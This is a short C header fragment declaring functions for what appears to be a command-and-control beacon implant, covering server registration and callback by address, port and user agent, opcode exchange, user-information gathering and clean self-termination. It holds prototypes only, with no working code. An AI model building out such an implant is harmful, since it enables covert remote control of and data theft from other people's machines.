BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent, LPCWSTR UriBuffer, DWORD dwSize);
LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent, DWORD *OpCode, LPCSTR SendBuffer, DWORD SendOpCode, DWORD SendBufferSize);
BOOL GetBasicUserInfo(struct BasicUserInfo *UserInfo);

LPVOID DieCleanly();

LPVOID ReportExecutionFail();